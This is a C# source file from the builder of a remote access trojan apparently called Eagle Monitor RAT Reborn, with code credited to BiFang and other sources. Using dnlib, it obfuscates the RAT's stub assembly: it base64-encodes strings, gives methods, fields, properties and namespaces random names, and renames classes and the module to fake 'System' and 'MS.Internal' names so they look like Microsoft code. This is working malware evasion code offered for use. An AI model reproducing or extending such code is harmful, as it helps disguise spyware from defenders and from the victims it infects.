using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System;
using System.Linq;
using System.Text;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| From : https://github.com/MicrobBlue/BiFang/blob/master/src/BiFang/until/Obfuscate.cs ||
*/

namespace Eagle_Monitor_RAT_Reborn.Builder
{
    internal class Obfuscate
    {
        #region "BiFang"
        private static void ObfuscateMethods(ModuleDef md)
        {
            foreach (var type in md.GetTypes())
            {
                // create method to obfuscation map
                foreach (MethodDef method in type.Methods)
                {
                    // empty method check
                    if (!method.HasBody) continue;
                    // method is a constructor
                    if (method.IsConstructor) continue;
                    // method overrides another
                    if (method.HasOverrides) continue;
                    // method has a rtspecialname, VES needs proper name
                    if (method.IsRuntimeSpecialName) continue;
                    // method foward declaration
                    if (method.DeclaringType.IsForwarder) continue;
                    Random random = new Random();
                    string encName = Misc.RandomString.RandomStringFunction(random.Next(5, 11));
                   // Console.WriteLine($"{method.Name} -> {encName}");
                    method.Name = encName;
                }
            }
        }

        private static void ObfuscateStrings(ModuleDef md)
        {
            foreach (var type in md.GetTypes())
            {
                foreach (MethodDef method in type.Methods)
                {
                    if (!method.HasBody) continue;
                    for (int i = 0; i < method.Body.Instructions.Count(); i++)
                    {
                        if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                        {
                            String regString = method.Body.Instructions[i].Operand.ToString();
                            String encString = Convert.ToBase64String(UTF8Encoding.UTF8.GetBytes(regString));

                            method.Body.Instructions[i].OpCode = OpCodes.Nop; // errors occur if instruction not replaced with Nop
                            method.Body.Instructions.Insert(i + 1, new Instruction(OpCodes.Call, md.Import(typeof(System.Text.Encoding).GetMethod("get_UTF8", new Type[] { })))); // Load string onto stack
                            method.Body.Instructions.Insert(i + 2, new Instruction(OpCodes.Ldstr, encString)); // Load string onto stack
                            method.Body.Instructions.Insert(i + 3, new Instruction(OpCodes.Call, md.Import(typeof(System.Convert).GetMethod("FromBase64String", new Type[] { typeof(string) })))); // call method FromBase64String with string parameter loaded from stack, returned value will be loaded onto stack
                            method.Body.Instructions.Insert(i + 4, new Instruction(OpCodes.Callvirt, md.Import(typeof(System.Text.Encoding).GetMethod("GetString", new Type[] { typeof(byte[]) })))); // call method GetString with bytes parameter loaded from stack
                            i += 4;
                        }
                    }
                }
            }
        }

        private static void ObfuscateClasses(ModuleDef md)
        {
            foreach (var type in md.GetTypes())
            {
                Random random = new Random();
                string encName = "System." + Misc.RandomString.RandomStringFunction(random.Next(5, 11));
                type.Name = encName;
            }
        }

        private static void CleanAsm(ModuleDef md)
        {
            foreach (var type in md.GetTypes())
            {
                foreach (MethodDef method in type.Methods)
                {
                    // empty method check
                    if (!method.HasBody) continue;

                    method.Body.SimplifyBranches();
                    method.Body.OptimizeBranches(); // negates simplifyBranches
                    //method.Body.OptimizeMacros();
                }
            }
        }

        #endregion
        // Other
        #region "Obfuscator from other src"
        private static Dictionary<string, string> _namesFields = new Dictionary<string, string>();
        private static void ObfuscateFields(ModuleDef md) 
        {
            foreach (TypeDef type in md.GetTypes())
            {
                if (type.IsGlobalModuleType)
                    continue;

                foreach (var field in type.Fields)
                {
                    string nameValue;
                    if (_namesFields.TryGetValue(field.Name, out nameValue))
                        field.Name = nameValue;
                    else
                    {
                        if (!field.IsSpecialName && !field.HasCustomAttributes)
                        {
                            string newName = Misc.RandomString.GenerateRandomString();
                            _namesFields.Add(field.Name, newName);
                            field.Name = newName;
                        }
                    }
                }
            }
            ApplyChangesToResourcesFields(md);
        }
        private static void ApplyChangesToResourcesFields(ModuleDef md)
        {
            foreach (TypeDef type in md.GetTypes())
            {
                if (type.IsGlobalModuleType)
                    continue;

                foreach (MethodDef method in type.Methods)
                {
                    if (method.Name != "InitializeComponent")
                        continue;

                    var instr = method.Body.Instructions;

                    for (int i = 0; i < instr.Count - 3; i++)
                    {
                        if (instr[i].OpCode == OpCodes.Ldstr)
                        {
                            foreach (var item in _namesFields)
                            {
                                if (item.Key == instr[i].Operand.ToString())
                                {
                                    instr[i].Operand = item.Value;
                                }
                            }
                        }
                    }
                }
            }
        }


        private static void ObfuscateProperties(ModuleDef md)
        {
            foreach (TypeDef type in md.GetTypes())
            {
                if (type.IsGlobalModuleType)
                    continue;

                foreach (var property in type.Properties)
                {
                    property.Name = Misc.RandomString.GenerateRandomString();
                }
            }
        }


        private static Dictionary<string, string> _namesSpaces = new Dictionary<string, string>();

        private static void ObfuscateNamespaces(ModuleDef md)
        {
            md.Name = Misc.RandomString.GenerateRandomString();

            foreach (TypeDef type in md.GetTypes())
            {
                if (type.IsGlobalModuleType)
                    continue;

                if (type.Namespace == "")
                    continue;

                string nameValue;
                if (_namesSpaces.TryGetValue(type.Namespace, out nameValue))
                    type.Namespace = nameValue;
                else
                {
                    string newName = Misc.RandomString.GenerateRandomString();

                    _namesSpaces.Add(type.Namespace, newName);
                    type.Namespace = newName;
                }
            }
            ApplyChangesToResourcesNamespace(md);
        }

        private static void ApplyChangesToResourcesNamespace(ModuleDef md)
        {

            foreach (var resource in md.Resources)
            {
                foreach (var item in _namesSpaces)
                {
                    if (resource.Name.Contains(item.Key))
                    {
                        resource.Name = resource.Name.Replace(item.Key, item.Value);
                    }
                }
            }

            foreach (TypeDef type in md.GetTypes())
            {
                foreach (var property in type.Properties)
                {
                    if (property.Name != "ResourceManager")
                        continue;

                    var instr = property.GetMethod.Body.Instructions;

                    for (int i = 0; i < instr.Count; i++)
                    {
                        if (instr[i].OpCode == OpCodes.Ldstr)
                        {
                            foreach (var item in _namesSpaces)
                            {
                                if (instr[i].ToString().Contains(item.Key))
                                    instr[i].Operand = instr[i].Operand.ToString().Replace(item.Key, item.Value);
                            }
                        }
                    }
                }
            }
        }
        #endregion
        // Other
        internal static void ObfuscateStub(ModuleDef md)//, string outFile)
        {
            md.Name = "MS.Internal" + Misc.RandomString.RandomStringFunction(3);////From BiFang + changed by other
            ObfuscateStrings(md);       //From BiFang
            ObfuscateMethods(md);       //From BiFang
            ObfuscateClasses(md);       //From BiFang
            ObfuscateFields(md);        //From other
            ObfuscateProperties(md);    //From other
            ObfuscateNamespaces(md);    //From other

            CleanAsm(md);
        }
    }
}
